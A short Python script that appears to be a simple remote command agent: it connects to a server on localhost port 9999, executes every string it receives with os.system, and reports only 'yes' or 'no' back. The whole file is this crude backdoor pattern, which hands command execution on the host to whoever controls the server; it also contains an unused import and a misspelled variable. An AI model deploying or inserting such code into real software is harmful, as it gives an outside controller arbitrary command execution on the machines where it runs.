from pydoc import cli
import socket
import os

server_add=('localhost',9999)
client=socket.socket()
client.connect(server_add)

while True:
    command=client.recv(1000).decode()
    try:
        outut=os.system(command)
        client.sendall(bytes("yes".encode()))
    except:
        client.sendall(bytes("no".encode()))    
        client.close()